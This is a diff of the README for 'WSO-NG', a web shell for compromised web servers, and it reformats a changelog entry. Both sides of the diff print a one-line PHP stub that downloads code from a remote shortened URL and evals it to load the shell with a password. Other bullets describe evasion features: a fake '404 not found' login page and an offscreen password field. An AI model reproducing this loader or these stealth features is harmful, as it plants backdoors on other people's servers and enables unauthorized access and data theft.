@@ -6,7 +6,11 @@ New generation of famous WSO web shell. With perks included
 ![image](https://user-images.githubusercontent.com/1212294/149636349-e580a04e-846f-4240-8b94-644d6e9aca5a.png)
 
 # changes
-- can now hook password when loaded via stub ```<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>```, and will use it instead of hardcoded one
+- can now hook password when loaded via stub 
+```
+<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>
+```
+and will use it instead of hardcoded one
 - all subfile downloads are now cached in /tmp and zipped
 - login page show natural site "404 not found" page. Just type password and press Enter, cuz password field hidden offscreen, but focused already.
 - new breadcrumps navigation panel. Must be much more usefull.
